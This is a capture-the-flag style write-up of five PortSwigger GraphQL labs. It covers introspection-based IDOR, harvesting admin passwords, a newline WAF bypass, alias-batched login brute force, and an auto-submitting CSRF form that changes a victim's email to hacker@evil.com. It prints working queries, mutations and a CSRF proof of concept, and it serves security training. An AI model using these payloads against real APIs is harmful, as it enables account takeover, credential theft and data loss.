---
layout: mission
title: "Mastering GraphQL Attacks: A Deep Dive into PortSwigger Labs (Part 2)"
date: 2026-01-05
categories: [Web Security, Exploitation, GraphQL]
toc: true
---

# ⚔️ Exploiting GraphQL: From Theory to Practice

In Part 1, we explored the architecture of GraphQL and how its design choices—like the single endpoint and introspection—create a unique attack surface.

Now, we move to **exploitation**. This guide breaks down five distinct scenarios from the PortSwigger Web Security Academy, demonstrating how to weaponize Introspection, bypass defenses, and exploit implementation flaws like rate-limiting oversights and CSRF.

---

## 🧪 LAB 1: Accessing Private GraphQL Posts

### 🧐 How the Vulnerability Exists
This lab demonstrates **Broken Access Control** (specifically IDOR) combined with **Introspection Information Disclosure**.

1.  **Introspection Enabled:** The API allows querying `__schema`, revealing the existence of a hidden field (`postPassword`) that the frontend application never requests.
2.  **Broken Access Control:** The server trusts the user's input (`id`) without verifying if the user *should* see that specific post.
3.  **Sequential IDs:** The use of IDs `1`, `2`, `4` suggests a gap at `3`, making the hidden resource easy to guess.

### ⚠️ Preconditions
* Introspection is enabled.
* The attacker can modify the query to request fields not present in the standard UI.

### 🚨 Exploitation Steps

1.  **Reconnaissance (The Gap Analysis):**
    Browse the blog and capture the `POST /graphql/v1` request in **Burp Proxy**.
    Notice the `getAllBlogPosts` query returns IDs `1`, `2`, and `4`.
    **Hypothesis:** A hidden post exists at **ID 3**.

2.  **Schema Extraction:**
    Send the request to **Repeater**.
    Right-click the body > **GraphQL** > **Set introspection query**.
    Search the response for the `BlogPost` type.
    **Discovery:** A field named `postPassword` is listed but never used in the UI.

    ![image](/images/Pasted%20image%2020260112180511.png)

3.  **Targeted Extraction:**
    Construct a query to fetch the specific post (`id: 3`) and the hidden field.
    ```
    query getBlogPost($id: Int!) {
      blogPost(id: $id) {
        id
        postPassword
      }
    }
    ```
    Set variables: `{"id": 3}`.
    **Send** the request.

4.  **Result:**
    The API returns the password for the hidden post.

    ![image](/images/Pasted%20image%2020260112180551.png)

**IMPACT:** Unauthorized access to private data (IDOR).

---

## 🧪 LAB 2: Accidental Exposure of Private GraphQL Fields

### 🧐 How the Vulnerability Exists
This is a classic **Broken Object Level Authorization (BOLA)** vulnerability facilitated by a **Shadow API**.

1.  **Shadow API:** The `getUser` query exists in the schema but isn't used by the application. It acts as an administrative interface left exposed.
2.  **Sensitive Field Exposure:** The `User` type includes a `password` field that is retrievable via standard queries.
3.  **Missing AuthZ:** The query takes a user `id` but does not check if the requester is an administrator.

### ⚠️ Preconditions
Ability to introspect the schema to find unused queries.
Lack of field-level authorization checks.

### 🚨 Exploitation Steps

1.  **Map the API:**
    Capture a login request and send it to **Repeater**.
    Replace the body with an introspection query to get the full schema.
    **Pro Tip:** Use **Right-Click > GraphQL > Save GraphQL queries to site map** to visualize the API structure in the **Target** tab.

2.  **Identify the Weakness:**
    * In the Site Map, find the `getUser` query.
    * Notice it accepts an `id` and returns a `User` type, which includes `username` and `password`.

    ![image](/images/Pasted%20image%2020260112175708.png)

3.  **Enumerate Administrators:**
    Send the `getUser` query to **Repeater**.
    Fuzz the `id` variable. Start with `1` (usually the admin).
    ```
    query getUser($id: Int!) {
      getUser(id: $id) {
        username
        password
      }
    }
    ```
    * **Send** with variable `{"id": 1}`.

4.  **Result:**
    The API returns the credentials for `administrator`.
    Log in and delete the user `carlos` to solve the lab.

    ![image](/images/Pasted%20image%2020260112175729.png)

**IMPACT:** Privilege Escalation / Account Takeover.

---

## 🧪 LAB 3: Finding a Hidden GraphQL Endpoint

### 🧐 How the Vulnerability Exists
Developers sometimes deploy GraphQL on non-standard paths or attempt to secure it with weak WAF rules.

1.  **Obscure Endpoint:** The API is located at `/api`, not `/graphql`.
2.  **Method Confusion:** The endpoint rejects `POST` requests or standard introspection but allows **GET** requests with query parameters.
3.  **Weak WAF:** A WAF blocks the string `__schema`, but regex-based filtering is easily bypassed.

### ⚠️ Preconditions
The server supports `GET` method queries.
The WAF uses simple pattern matching.

### 🚨 Exploitation Steps

1.  **Endpoint Discovery:**
    Fuzz for endpoints (`/api`, `/graphql`, `/v1`).
    Sending `GET /api` returns `{"error": "Query not present"}`. This specific error confirms a GraphQL endpoint is listening.

2.  **Bypassing the WAF:**
    Send a standard introspection query: `/api?query={__schema{...}}`.
    **Block:** "Introspection not allowed".
    **Bypass:** Inject a URL-encoded newline (`%0a`) to break the regex signature.
    Payload: `/api?query=query+IntrospectionQuery+%7B%0A++__schema%0a+%7B...`.

    ![image](/images/Pasted%20image%2020260112193359.png)

3.  **Exploit:**
    Use the introspected schema to find the `deleteOrganizationUser` mutation.
    Identify the victim (Carlos) has `id: 3`.
    Send the deletion mutation (via GET or POST if allowed):
    ```
    mutation {
      deleteOrganizationUser(input: {id: 3}) {
        user { id }
      }
    }
    ```

    ![image](/images/Pasted%20image%2020260112193545.png)

**IMPACT:** Authorization Bypass leading to Data Loss.

---

## 🧪 LAB 4: Bypassing GraphQL Brute Force Protections

### 🧐 How the Vulnerability Exists
This lab exploits a fundamental disconnect between **Network Rate Limiting** and **GraphQL Batching**.

1.  **Network Limit:** The WAF blocks IPs that send more than *N* HTTP requests per minute.
2.  **GraphQL Aliases:** The GraphQL specification allows multiple queries to be bundled ("batched") into a single HTTP request using **Aliases**.
3.  **The Bypass:** The WAF sees **1 HTTP request**. The GraphQL engine executes **100 login attempts**.

### ⚠️ Preconditions
Rate limiting is implemented at the HTTP layer, not the GraphQL operation layer.

### 🚨 Exploitation Steps

1.  **Verify Limits:**
    Attempt to log in 5 times rapidly. Observe the "Rate Limit Exceeded" error.

2.  **Construct the "Mega-Query":**
    Use a Python script to generate a single mutation containing aliases for every password in your wordlist.
    
    ![image](/images/Pasted%20image%2020260112185734.png)

    ```
    mutation {
      try1: login(input: {user: "carlos", password: "123456"}) { token success }
      try2: login(input: {user: "carlos", password: "password"}) { token success }
      ...
      try100: login(input: {user: "carlos", password: "secret"}) { token success }
    }
    ```

3.  **Execute & Analyze:**
    Send this single massive request in **Repeater**.
    The server will process all aliases and return a huge JSON response.
    Search the response for `"success": true` or a valid token.
    Map the successful alias (e.g., `try45`) back to your password list.

    ![image](/images/Pasted%20image%2020260112185820.png)

    ![image](/images/Pasted%20image%2020260112185830.png)

**IMPACT:** Authentication Bypass (Brute Force).

---

## 🧪 LAB 5: Performing CSRF Exploits over GraphQL

### 🧐 How the Vulnerability Exists
This lab shows how **Content-Type Validation** failures turn safe APIs into CSRF targets.

1.  **The Standard:** GraphQL usually requires `Content-Type: application/json`. Browsers enforce CORS preflight checks for this, preventing CSRF.
2.  **The Flaw:** The server *also* accepts `application/x-www-form-urlencoded`.
3.  **The Attack:** HTML Forms *can* send `x-www-form-urlencoded` requests cross-origin without preflight. Since authentication relies on cookies (not Bearer tokens), the browser automatically authenticates the request.

### ⚠️ Preconditions
The API accepts `application/x-www-form-urlencoded`.
Authentication is cookie-based.
No CSRF tokens are enforced.

### 🚨 Exploitation Steps

1.  **Verify Vulnerability:**
    Capture a mutation (e.g., `changeEmail`) in **Repeater**.
    Right-click > **Change request method** (toggles to GET).
    Right-click > **Change request method** (toggles to POST with form encoding).
    Ensure the body is formatted as `query=mutation...&variables=...`.
    If the server accepts this, it is vulnerable.

    ![image](/images/Pasted%20image%2020260112190922.png)

2.  **Generate CSRF PoC:**
    Use **Engagement tools > Generate CSRF PoC**.
    The generated HTML will look like a standard form:
    ```
    <form action="[https://target-lab.net/graphql/v1](https://target-lab.net/graphql/v1)" method="POST">
      <input type="hidden" name="query" value='mutation { changeEmail(input: { email: "hacker@evil.com" }) { email } }'/>
      <input type="submit" />
    </form>
    <script>document.forms[0].submit();</script>
    ```

3.  **Deliver:**
    Host this on the exploit server.
    When the victim visits, their browser submits the form, changing their email address.

**IMPACT:** Account Takeover via CSRF.

---

## ⚡ Fast Triage Cheat Sheet

| Attack Vector | 🚩 Immediate Signal | 🔧 The Critical Move |
| :--- | :--- | :--- |
| **Introspection** | `__schema` returns JSON data. | Save site map & search for hidden queries (`getUser`, `backup`). |
| **BOLA / IDOR** | Queries taking `id` arguments. | Fuzz IDs (`1`, `2`, `3`) & check other users' data. |
| **Hidden Endpoints** | `GET /api` returns "Query not present". | Fuzz universal queries (`{__typename}`) on `GET` & `POST`. |
| **Brute Force** | Rate limit errors on repeated logins. | Use **Aliases** to bundle 100+ attempts in one request. |
| **CSRF** | API accepts `x-www-form-urlencoded`. | Generate HTML form to submit mutation cross-origin. |
